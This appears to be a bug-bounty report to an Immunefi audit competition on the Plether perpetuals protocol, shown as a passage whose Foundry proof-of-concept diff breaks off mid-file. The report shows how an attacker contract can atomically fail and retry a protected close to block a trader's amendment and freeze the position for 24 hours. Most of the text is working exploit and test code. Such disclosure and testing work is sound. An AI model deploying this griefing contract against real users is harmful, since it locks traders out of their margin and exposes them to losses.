# \#100004 [SC-High] Permissionless protection retry preempts owner amendment and can freeze a position for 24 hours

**Submitted on Nov 16th 2026 at 02:16:11 UTC by @polymix123 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100004
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

# Permissionless protection retry preempts owner amendment and can freeze a position for 24 hours

**Severity: High — temporary freezing of funds for at least 24 hours.**

## Brief/Intro

When a protected close fails because its retained financial limit has become stale, anyone can retry it before the trader amends that limit. An attacker can combine failure and retry in one transaction, leaving the protection continuously `Triggered` between transactions. A production-contract Foundry test repeats this through a 24-hour frozen market: the trader cannot reduce or close the position or release its position margin, while the attacker needs no fresh signed price or Pyth fee during the frozen interval. The duration requires the attacker to keep submitting transactions and win ordering against any competing atomic owner recovery.

## Vulnerability Details

`PositionProtectionBook.handleFailedProtectionAttempt` returns an unchanged protected position from `Triggered` to `Latched`. The trader can amend its retained close limits only while `Latched` and with no pending order. Yet `retryPositionProtectionClose` has the same state prerequisites and **no caller restriction**. It creates a fresh protection child and `_recordCloseAttempt` immediately restores `Triggered`. The fresh child copies the original financial ceilings and receives a new execution window.

The missing owner-priority interval lets an attacker contract call `OrderRouter.executeOrder(child, data)` and `retryPositionProtectionClose(protectionId)` atomically. The first call terminalizes a child that cannot meet its retained ceiling; the second consumes the `Latched` state before the owner can submit an amendment. The owner then sees only `Triggered` and a pending child. Owner amendment reverts, as do protection replacement and cancellation. Ordinary partial and full closes are blocked by the active protection; the manual cancel-and-close path is available only while `Armed`.

This is the incomplete repair of Cecuro **MED-9**. That fix retained the trader's ceilings on every retry and added an owner amendment while `Latched`; it did not give the owner a chance to use that amendment before a permissionless retry. The documented known liveness limit concerns unpaid cleanup and a protection remaining **`Latched` without a live child**. Here an active adversary repeatedly consumes `Latched`, leaving the trader **`Triggered` with a live, stale-bound child** between transactions. The existing ceilings and the disclosed unattended-keeper case therefore do not resolve this owner-recovery failure.

The strongest reproducible path starts with a publicly opened 10,000-synthetic LONG and a valid 10,000-USDG execution-notional ceiling at mark `1.00`. An ordinary move to `1.10` makes the protected close's notional 11,000 USDG, so the ceiling is stale. The protection triggers just before the Friday frozen interval. The attacker then executes the current child using an empty oracle payload at the cached `1.10` mark. The child ends as `ConstraintViolation`; the same transaction retries it with the unchanged 10,000-USDG ceiling. In frozen mode `PletherOracle.getOrderExecutionFee` returns zero. Repeating the bundle at each 60-second deadline before strict expiry requires no fresh Pyth update during the frozen interval.

| PoC path | Demonstrated result |
| --- | --- |
| Frozen cached-mark failure → retry | 1 initial bundle plus 1,440 renewals; protection remains `Triggered` for exactly 86,400 seconds; zero additional Pyth ETH; protected position remains open with 1,976.099401 USDG gross position margin. |
| Ordinary-market historical failure → retry | 1,440 renewals over 86,400 seconds using six-feed historical payloads. This variant requires timely qualifying signed ticks and oracle fees. |
| Strict expiry → retry | 1,420 renewals over 86,620 seconds with empty payloads. This variant needs the attacker to win each expiry-boundary ordering contest. |
| Owner controls | The ordinary-market control amends to a 25,000-USDG ceiling, then executes the next protected close and releases the lock. The separate frozen smart-account control proves that an owner-first atomic failure → amendment → retry wins priority and installs widened limits; it does not execute that amended child. |

The test uses the audited production Router, Engine, protection Book, Oracle, Clearinghouse, HousePool and vault implementations. Only USDG and Pyth are mocks. It installs six release feeds and active launch settings, opens the position through the public V3 order path, and checks the denial through public entry points. No storage is seeded and no in-scope contract is modified.

**Reproduce at the audited commit:** Apply [`H3_Retry_Preemption_24h_Freeze_M1_Retry_Preempts_Amendment.patch`](H3_Retry_Preemption_24h_Freeze_M1_Retry_Preempts_Amendment.patch) from the repository root, initialize submodules, and run:

```sh
FOUNDRY_GAS_LIMIT=50000000000 forge test \
  --root packages/perps --offline \
  --match-path 'test/foundry/h3_m1/*' -vv
```

The 50-billion test gas limit accommodates the aggregate gas of 1,440 separately modeled renewal transactions inside one Foundry test. It is not an on-chain single-transaction gas requirement. Verified on a clean worktree at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with Forge 1.5.1 and Solc 0.8.35: all nine tests passed. The frozen 24-hour test logged `m1.frozen.duration.seconds: 86400`, `m1.frozen.position.margin.atoms: 1976099401`, and `m1.frozen.pythFeeWei: 0`.

## Impact Details

The affected trader cannot voluntarily reduce or close the protected position or release its position-backed margin while the attacker keeps the record `Triggered`. The 1,976.099401 USDG observed in the PoC is **gross position margin**, not an estimate of net recoverable proceeds: the adverse mark also creates price loss, and carry continues. The trader remains exposed to further price movement and liquidation throughout the delay. Liquidation is not a voluntary recovery route. The attack transfers no USDG to the preemptor; the [listed High impact](https://immunefi.com/audit-competition/plether/scope/) is the demonstrated 24-hour temporary freeze.

This is a conditional, sustained denial. The attacker pays transaction gas and must maintain the renewal schedule. A smart-account owner with access to the current child can batch failing it, amending the limits, and retrying; if that transaction is ordered first, the owner installs a widened child. The frozen owner-control test proves this priority result, while the ordinary-market control separately proves that an amended child can close the position. If the attacker stops, loses the ordering contest, or the retained close becomes executable, the freeze can end. A plain EOA owner cannot insert an amendment between the two calls in the attacker's atomic bundle. The frozen-market variant removes recurring signed-tick and Pyth-fee needs, but it does not remove transaction-ordering competition or establish the real-world cost of a day-long attack.

The issue is the owner amendment lane being preemptible after a failed protection child. Retaining the owner's ceilings on retry protects against a different risk but also keeps the stale bound on every attacker-created child. A repair should let the owner amend the current or next child while `Triggered`, or provide an owner-priority atomic recovery path before unrestricted retry resumes. This preserves permissionless retry after the owner's opportunity to repair.

## References

- [Audited repository at `a82d4fef`](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Cecuro audit, MED-9 remediation note, PDF page 27](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=27)
- [Live Immunefi scope and known-issues policy](https://immunefi.com/audit-competition/plether/scope/)
- [Unlisted PoC gist with judge-applyable patch and exact run commands](https://gist.github.com/fuzious/1ff2eaedf28a7e361fb0f9e03d1f5f84)
- [`PositionProtectionBook`: owner-only `Latched` amendment and permissionless retry](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L405)
- [`PositionProtectionBook`: failed-child relatch and `Triggered` restoration](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L667)
- [`OrderLiquidationBatchLogic`: retry copies retained limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L655-L679)
- [`OrderLiquidationBatchLogic`: ordinary closes blocked by active protection](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L305-L315)
- [`PletherOracle`: frozen execution fee is zero](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L496-L515)
- [`SECURITY.md`: intended `Triggered`/`Latched` states and disclosed unpaid-cleanup limit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L547-L561)
- [`SECURITY.md`: documented prolonged `Latched` liveness warning](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1355-L1359)


## Link to Proof of Concept

https://gist.github.com/fuzious/1ff2eaedf28a7e361fb0f9e03d1f5f84

## Proof of Concept

```diff
diff --git a/packages/perps/test/foundry/h3_m1/H3M1ProtectionRetry.t.sol b/packages/perps/test/foundry/h3_m1/H3M1ProtectionRetry.t.sol
new file mode 100644
index 00000000..18597005
--- /dev/null
+++ b/packages/perps/test/foundry/h3_m1/H3M1ProtectionRetry.t.sol
@@ -0,0 +1,868 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
+import {CfdEngine} from "@plether/perps/CfdEngine.sol";
+import {CfdEngineAdmin} from "@plether/perps/CfdEngineAdmin.sol";
+import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
+import {CfdEnginePlanner} from "@plether/perps/CfdEnginePlanner.sol";
+import {CfdEngineSettlementSidecar} from "@plether/perps/CfdEngineSettlementSidecar.sol";
+import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {HousePool} from "@plether/perps/HousePool.sol";
+import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
+import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
+import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
+import {OrderRouter} from "@plether/perps/OrderRouter.sol";
+import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
+import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
+import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {PletherOracle} from "@plether/perps/PletherOracle.sol";
+import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
+import {TrancheVault} from "@plether/perps/TrancheVault.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
+import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
+import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
+import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
+import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
+import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
+import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
+import {MockPyth} from "@plether/test-utils/MockPyth.sol";
+import {Test} from "forge-std/Test.sol";
+
+interface IProtectionExpiryRouter {
+
+    function executeOrder(
+        uint64 orderId,
+        bytes[] calldata pythUpdateData
+    ) external payable returns (OrderV3Types.ExecutionResult memory result);
+
+}
+
+contract ProtectionRetryPreemptor {
+
+    error UnexpectedChild(uint8 status, uint8 reason, uint8 pendingReason);
+
+    IProtectionExpiryRouter internal immutable ROUTER;
+    IPositionProtectionActions internal immutable ACTIONS;
+
+    constructor(
+        address router,
+        address actions
+    ) {
+        ROUTER = IProtectionExpiryRouter(router);
+        ACTIONS = IPositionProtectionActions(actions);
+    }
+
+    function retryOnly(
+        uint64 protectionId
+    ) external returns (uint64 nextOrderId) {
+        return ACTIONS.retryPositionProtectionClose(protectionId);
+    }
+
+    function failAndRetry(
+        uint64 orderId,
+        uint64 protectionId,
+        bytes[] calldata historicalData
+    ) external payable returns (uint64 nextOrderId) {
+        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder{value: msg.value}(orderId, historicalData);
+        if (result.status != OrderV3Types.LifecycleStatus.Failed
+            || result.terminalReason != OrderV3Types.TerminalReason.ConstraintViolation) {
+            revert UnexpectedChild(uint8(result.status), uint8(result.terminalReason), uint8(result.pendingReason));
+        }
+        return ACTIONS.retryPositionProtectionClose(protectionId);
+    }
+
+    function expireAndRetry(
+        uint64 orderId,
+        uint64 protectionId
+    ) external returns (uint64 nextOrderId) {
+        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder(orderId, new bytes[](0));
+        require(result.status == OrderV3Types.LifecycleStatus.Failed, "expiry did not terminalize");
+        require(result.terminalReason == OrderV3Types.TerminalReason.Expired, "not expired");
+        return ACTIONS.retryPositionProtectionClose(protectionId);
+    }
+
+}
+
+/// @dev Owner-side batching contract (smart-contract account): the owner's strongest atomic
+///      competitor at an expiry boundary. It terminalizes the expired child, amends the retained
+///      close limits while `Latched` with zero pending orders, and retries — all in one transaction.
+contract OwnerBatch {
+
+    IProtectionExpiryRouter internal immutable ROUTER;
+    IPositionProtectionActions internal immutable ACTIONS;
+
+    constructor(
+        address router,
+        address actions
+    ) {
+        ROUTER = IProtectionExpiryRouter(router);
+        ACTIONS = IPositionProtectionActions(actions);
+    }
+
+    function expireAmendAndRetry(
+        uint64 orderId,
+        uint64 protectionId,
+        PositionProtectionTypes.CloseFinancialLimits calldata limits
+    ) external returns (uint64 nextOrderId) {
+        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder(orderId, new bytes[](0));
+        require(result.status == OrderV3Types.LifecycleStatus.Failed, "expiry did not terminalize");
+        require(result.terminalReason == OrderV3Types.TerminalReason.Expired, "boundary lost: child not expirable");
+        ACTIONS.amendLatchedPositionProtectionCloseLimits(protectionId, limits);
+        return ACTIONS.retryPositionProtectionClose(protectionId);
+    }
+
+    function failAmendAndRetry(
+        uint64 orderId,
+        uint64 protectionId,
+        bytes[] calldata historicalData,
+        PositionProtectionTypes.CloseFinancialLimits calldata limits
+    ) external payable returns (uint64 nextOrderId) {
+        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder{value: msg.value}(orderId, historicalData);
+        require(result.status == OrderV3Types.LifecycleStatus.Failed, "child must fail");
+        require(result.terminalReason == OrderV3Types.TerminalReason.ConstraintViolation, "wrong failure");
+        ACTIONS.amendLatchedPositionProtectionCloseLimits(protectionId, limits);
+        return ACTIONS.retryPositionProtectionClose(protectionId);
+    }
+
+}
+
+/// @notice Public lifecycle witness for permissionless retry preempting owner amendment.
+///         The frozen-market test demonstrates 24 hours under attacker-first ordering.
+contract ProtectionAmendmentPreemptionTest is Test {
+
+    uint256 private constant START_TIME = 1_709_532_000;
+    uint256 private constant CAP_PRICE = 2e8;
+    uint256 private constant LOT = CfdTypes.SIZE_QUANTUM;
+
+    address private constant ALICE = address(0xA11CE);
+    address private constant TRIGGER_KEEPER = address(0x7106);
+    address private constant EXECUTION_KEEPER = address(0xE0EC);
+    uint256 private constant MARK_PRICE = 1e8;
+    uint256 private constant LONG_STOP_LOSS = 110_000_000;
+    uint256 private constant POSITION_SIZE = 10_000e18;
+    uint256 private constant POSITION_MARGIN_ASSETS = 2000e6;
+
+    MockSettlementToken private token;
+    MockPyth private pyth;
+    MarginClearinghouse private clearinghouse;
+    CfdEngine private engine;
+    CfdEngineLens private lens;
+    HousePool private pool;
+    TrancheVault private senior;
+    TrancheVault private junior;
+    OrderRouter private router;
+    PletherOracle private oracle;
+    IPositionProtectionActions private protectionActions;
+    IPositionProtectionViews private protectionViews;
+    ProtectionRetryPreemptor private preemptor;
+    bytes32[] private feedIds;
+    uint256[] private basePrices;
+    uint256 private clientNonce;
+    uint256 private preExpiryStartedAt;
+    uint256 private frozenStartAnchor;
+
+    function setUp() public {
+        vm.warp(START_TIME);
+        token = new MockSettlementToken();
+        clearinghouse = new MarginClearinghouse(address(token));
+        CfdTypes.RiskParams memory risk = CfdTypes.RiskParams({
+            vpiFactor: 0.01e18,
+            maxSkewRatio: 0.4e18,
+            maintMarginBps: 10,
+            initMarginBps: 20,
+            fadMarginBps: 300,
+            baseCarryBps: 500,
+            minBountyAssets: 1e6,
+            bountyBps: 10,
+            keeperShareBps: 5000,
+            protocolShareBps: 0
+        });
+        engine = new CfdEngine(address(token), address(clearinghouse), CAP_PRICE, risk, 50);
+        CfdEnginePlanner planner = new CfdEnginePlanner();
+        CfdEngineSettlementSidecar settlement = new CfdEngineSettlementSidecar(address(engine));
+        CfdEngineAdmin engineAdmin = new CfdEngineAdmin(address(engine), address(this));
+        engine.setDependencies(address(planner), address(settlement), address(engineAdmin));
+        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(CAP_PRICE))));
+        lens = new CfdEngineLens(address(engine));
+
+        HousePoolRedemptionMathSidecar poolMath = new HousePoolRedemptionMathSidecar();
+        pool = new HousePool(address(token), address(engine), address(poolMath));
+        senior = new TrancheVault(token, address(pool), true, "Senior", "sAssets", 0, address(0));
+        junior = new TrancheVault(token, address(pool), false, "Junior", "jAssets", 0, address(0));
+        pool.setSeniorVault(address(senior));
+        pool.setJuniorVault(address(junior));
+        engine.setPool(address(pool));
+
+        pyth = new MockPyth();
+        (bytes32[] memory ids, uint256[] memory weights, uint256[] memory bases, bool[] memory inversions) =
+            _releaseTopology();
+        feedIds = ids;
+        basePrices = bases;
+        oracle = new PletherOracle(address(engine), address(pool), address(pyth), ids, weights, bases, inversions);
+
+        CfdOrderPolicyEvaluator evaluator = new CfdOrderPolicyEvaluator();
+        OrderRouterExecutionSidecar execution = new OrderRouterExecutionSidecar();
+        address predicted = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
+        OrderLifecycleBook lifecycle =
+            new OrderLifecycleBook(predicted, address(engine), address(clearinghouse), address(pool));
+        OrderRouterLiquidationBatchSidecar liquidation = new OrderRouterLiquidationBatchSidecar(predicted);
+        router = new OrderRouter(
+            address(engine),
+            address(lens),
+            address(pool),
+            address(oracle),
+            address(liquidation),
+            address(evaluator),
+            address(execution),
+            address(lifecycle)
+        );
+        assertEq(address(router), predicted);
+        engine.setOrderRouter(address(router));
+        clearinghouse.setEngine(address(engine));
+
+        _activateReleaseConfig();
+        _seedAndFundPool(50_500e6);
+        _warpToNextMondayAtTen();
+        router.updateMarkPrice(_livePayload(100, 100));
+
+        IPositionProtectionBook book = router.positionProtectionBook();
+        protectionActions = IPositionProtectionActions(address(book));
+        protectionViews = IPositionProtectionViews(address(book));
+        preemptor = new ProtectionRetryPreemptor(address(router), address(book));
+        _fundTrader(ALICE, 20_000e6);
+    }
+
+    function test_PermissionlessExpiryRetryPreemptsAmendmentForMoreThanTwentyFourHours() public {
+        (uint64 protectionId,) = _createFailedBoundedProtection(ALICE);
+        uint256 attackStart = vm.getBlockTimestamp();
+        uint256 attackerBalanceBefore = token.balanceOf(address(preemptor));
+        uint64 liveChild = preemptor.retryOnly(protectionId);
+        _assertTriggeredAndOwnerLocked(protectionId, liveChild);
+
+        assertEq(router.maxExecutionWindowSeconds(), 60, "launch retry window");
+        for (uint256 i; i < 1420; ++i) {
+            uint64 deadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+            vm.warp(uint256(deadline) + 1);
+            uint64 expiredChild = liveChild;
+            liveChild = preemptor.expireAndRetry(expiredChild, protectionId);
+            assertGt(liveChild, expiredChild, "retry must install a fresh child");
+            assertEq(router.pendingOrderCounts(ALICE), 1, "exactly one live child remains");
+            assertEq(
+                uint8(protectionViews.getPositionProtection(protectionId).status),
+                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
+                "atomic caller leaves no external Latched interval"
+            );
+            _assertRetainedCeilingAndZeroBounties(protectionId, liveChild);
+        }
+
+        uint256 lockedDuration = vm.getBlockTimestamp() - attackStart;
+        emit log_named_uint("locked.duration.seconds", lockedDuration);
+        assertGe(lockedDuration, 86_400, "1420 renewals lock >=24h");
+        assertEq(lockedDuration, 1420 * 61, "each renewal extends the freeze by exactly one 60s window");
+        _assertTriggeredAndOwnerLocked(protectionId, liveChild);
+        assertEq(token.balanceOf(address(preemptor)), attackerBalanceBefore, "preemptor receives no token reward");
+        (uint256 remainingSize, uint256 remainingMargin,,,,,) = engine.positions(ALICE);
+        emit log_named_uint("locked.position.margin", remainingMargin);
+        assertEq(remainingSize, POSITION_SIZE, "protected position remains open");
+        assertGt(remainingMargin, 0, "position margin remains locked behind the open position");
+    }
+
+    function test_Control_NoPreemptionLetsOwnerAmendAndClose() public {
+        (uint64 protectionId,) = _createFailedBoundedProtection(ALICE);
+        vm.prank(ALICE);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideCloseLimits());
+
+        uint64 retryOrderId = preemptor.retryOnly(protectionId);
+        bytes[] memory executionData = _executionPayload(retryOrderId, 110, 100);
+        vm.prank(EXECUTION_KEEPER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
+        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "successful close releases protection lock");
+        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
+        assertEq(remainingSize, 0, "owner amendment restores the exit");
+    }
+
+    function test_AttackerAtomicallyFailsFirstChildAndRetriesWithoutInitialAmendWindow() public {
+        _trade(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+        uint64 initialChild = _triggerAt(protectionId);
+
+        // The owner has no amendment entrypoint while the initial child is Triggered.
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _wideCloseLimits());
+
+        bytes[] memory historicalData = _executionPayload(initialChild, 110, 100);
+        uint64 newChild = preemptor.failAndRetry(initialChild, protectionId, historicalData);
+        assertGt(newChild, initialChild);
+        _assertTriggeredAndOwnerLocked(protectionId, newChild);
+        assertEq(router.pendingOrderCounts(ALICE), 1);
+        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 10_000e6);
+    }
+
+    function test_M1RepeatedPreExpiryHistoricalFailureRetryAndOwnerCompetition() public {
+        OwnerBatch owner = new OwnerBatch(address(router), address(protectionActions));
+        _fundTrader(address(owner), 20_000e6);
+        _trade(address(owner), CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(address(owner));
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+        uint64 liveChild = _triggerAt(protectionId);
+        uint64 firstDeadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+
+        uint256 fee = 1e12;
+        pyth.setFee(fee);
+        vm.deal(address(this), 1 ether);
+        uint256 pythEthBefore = address(pyth).balance;
+        preExpiryStartedAt = block.timestamp;
+        for (uint256 i; i < 8; ++i) {
+            uint64 deadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+            // Select a genuine first post-commit tick and include the attacker transaction at
+            // the old child's deadline. Expiry requires timestamp > deadline.
+            vm.warp(uint256(deadline) - 1);
+            bytes[] memory historicalData = _executionPayload(liveChild, 110, 100);
+            assertEq(block.timestamp, uint256(deadline));
+            uint64 oldChild = liveChild;
+            liveChild = preemptor.failAndRetry{value: 2 * fee}(oldChild, protectionId, historicalData);
+            assertGt(liveChild, oldChild);
+            assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
+                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+            assertEq(router.pendingOrderCounts(address(owner)), 1);
+            assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 10_000e6);
+
+            bool expiryBundleRecovered;
+            try owner.expireAmendAndRetry(liveChild, protectionId, _wideCloseLimits()) returns (uint64) {
+                expiryBundleRecovered = true;
+            } catch {
+                expiryBundleRecovered = false;
+            }
+            assertFalse(expiryBundleRecovered, "fresh child cannot be expired in same block");
+        }
+        assertEq(address(pyth).balance - pythEthBefore, 16 * fee, "each attacker renewal costs two Pyth fees");
+        assertEq(block.timestamp - preExpiryStartedAt, 8 * 60, "pre-expiry renewal advances one minute each");
+        assertEq(uint256(firstDeadline), preExpiryStartedAt + 60);
+
+        // A contract-account owner can instead execute the stale child and amend atomically.
+        // Its bundle succeeds if sequenced first; this is the strongest recovery competitor.
+        vm.warp(block.timestamp + 1);
+        bytes[] memory ownerData = _executionPayload(liveChild, 110, 100);
+        uint64 amendedChild = owner.failAmendAndRetry{value: 2 * fee}(
+            liveChild, protectionId, ownerData, _wideCloseLimits());
+        assertGt(amendedChild, liveChild);
+        assertEq(protectionViews.closeFinancialLimits(protectionId).maxExecutionNotionalAssets, 25_000e6);
+    }
+
+    function test_M1PreExpiryHistoricalRenewalsKeepProtectionTriggeredForTwentyFourHours() public {
+        _trade(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+        uint64 liveChild = _triggerAt(protectionId);
+
+        uint256 fee = 1e12;
+        pyth.setFee(fee);
+        vm.deal(address(this), 1 ether);
+        uint256 pythEthBefore = address(pyth).balance;
+        preExpiryStartedAt = block.timestamp;
+        for (uint256 i; i < 1440; ++i) {
+            if (i % 100 == 0) emit log_named_uint("m1.preExpiry.iteration", i);
+            uint64 deadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+            vm.warp(uint256(deadline) - 1);
+            bytes[] memory historicalData = _executionPayload(liveChild, 110, 100);
+            assertEq(block.timestamp, uint256(deadline), "attack lands before strict expiry");
+            liveChild = preemptor.failAndRetry{value: 2 * fee}(liveChild, protectionId, historicalData);
+            assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
+                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+            assertEq(router.pendingOrderCounts(ALICE), 1);
+        }
+        assertEq(block.timestamp - preExpiryStartedAt, 24 hours);
+        assertEq(address(pyth).balance - pythEthBefore, 2880 * fee);
+        _assertTriggeredAndOwnerLocked(protectionId, liveChild);
+        (uint256 positionSize, uint256 positionMargin,,,,,) = engine.positions(ALICE);
+        assertEq(positionSize, POSITION_SIZE);
+        assertGt(positionMargin, 0);
+        emit log_named_uint("m1.preExpiry.duration.seconds", block.timestamp - preExpiryStartedAt);
+        emit log_named_uint("m1.preExpiry.mockPythEthWei", address(pyth).balance - pythEthBefore);
+    }
+
+    function test_M1FrozenPreExpiryFailedCloseRetryNeedsNoPythPayloadOrFee() public {
+        _trade(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+
+        frozenStartAnchor = _nextFridayFreezeStart();
+        vm.warp(frozenStartAnchor - 3);
+        router.updateMarkPrice(_livePayload(110, 100));
+        uint64 liveChild = _triggerAt(protectionId);
+        assertLt(block.timestamp, frozenStartAnchor);
+        assertFalse(oracle.isOracleFrozen());
+
+        pyth.setFee(1e12);
+        uint256 pythEthBefore = address(pyth).balance;
+        vm.warp(frozenStartAnchor);
+        vm.roll(vm.getBlockNumber() + 1);
+        assertTrue(oracle.isOracleFrozen());
+        liveChild = preemptor.failAndRetry(liveChild, protectionId, new bytes[](0));
+        for (uint256 i; i < 8; ++i) {
+            uint64 deadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+            vm.warp(deadline);
+            vm.roll(vm.getBlockNumber() + 1);
+            assertTrue(oracle.isOracleFrozen());
+            liveChild = preemptor.failAndRetry(liveChild, protectionId, new bytes[](0));
+            assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
+                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+            assertEq(router.pendingOrderCounts(ALICE), 1);
+        }
+        assertEq(address(pyth).balance, pythEthBefore, "frozen execution pays no Pyth fee");
+        assertEq(block.timestamp - frozenStartAnchor, 8 * 60);
+        _assertTriggeredAndOwnerLocked(protectionId, liveChild);
+    }
+
+    function test_M1FrozenPreExpiryRetryHoldsTwentyFourHoursWithoutSignedTicks() public {
+        _trade(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, false, 100, 100);
+        router.updateMarkPrice(_livePayload(100, 100));
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(_params());
+        frozenStartAnchor = _nextFridayFreezeStart();
+        vm.warp(frozenStartAnchor - 3);
+        router.updateMarkPrice(_livePayload(110, 100));
+        uint64 liveChild = _triggerAt(protectionId);
+
+        pyth.setFee(1e12);
+        uint256 pythEthBefore = address(pyth).balance;
+        vm.warp(frozenStartAnchor);
+        vm.roll(vm.getBlockNumber() + 1);
+        assertTrue(oracle.isOracleFrozen());
+        liveChild = preemptor.failAndRetry(liveChild, protectionId, new bytes[](0));
+        for (uint256 i; i < 1440; ++i) {
+            uint64 deadline = router.lifecycleBook().orderTiming(liveChild).executionDeadline;
+            vm.warp(deadline);
+            vm.roll(vm.getBlockNumber() + 1);
+            assertTrue(oracle.isOracleFrozen());
+            liveChild = preemptor.failAndRetry(liveChild, protectionId, new bytes[](0));
+            assertEq(uint8(protectionViews.getPositionProtection(protectionId).status),
+                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+            assertEq(router.pendingOrderCounts(ALICE), 1);
+        }
+        assertEq(block.timestamp - frozenStartAnchor, 24 hours);
+        assertEq(address(pyth).balance, pythEthBefore);
+        _assertTriggeredAndOwnerLocked(protectionId, liveChild);
+        (uint256 positionSize, uint256 positionMargin,,,,,) = engine.positions(ALICE);
+        assertEq(positionSize, POSITION_SIZE);
+        assertGt(positionMargin, 0);
+        emit log_named_uint("m1.frozen.duration.seconds", block.timestamp - frozenStartAnchor);
+        emit log_named_uint("m1.frozen.position.margin.atoms", positionMargin);
